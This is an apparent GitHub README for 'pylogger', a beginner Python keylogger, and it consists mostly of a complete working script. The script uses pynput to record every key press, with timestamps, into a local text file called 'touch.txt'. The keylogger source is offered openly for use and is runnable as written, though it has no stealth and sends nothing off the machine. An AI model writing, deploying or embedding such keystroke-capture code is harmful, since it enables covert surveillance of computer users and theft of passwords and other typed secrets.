# pylogger
A simple keylogger in python for beginner 

Today i shod you a simple logger in py



=======================================================================
                               CODE
=======================================================================

from pynput.keyboard import Listener
import logging

file = "touch.txt"
logging.basicConfig(filename=file, level=logging.DEBUG, format="%(asctime)s %(message)s")

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
    
======================================================================

start main.py and a windows opens touch any key on your keyboard and 
a simple txt file is created his name is "touch.txt" in you can check 
the key pressed.


![image](https://user-images.githubusercontent.com/73192519/111074685-71b48d00-84e4-11eb-8435-6ddfbc503330.png)
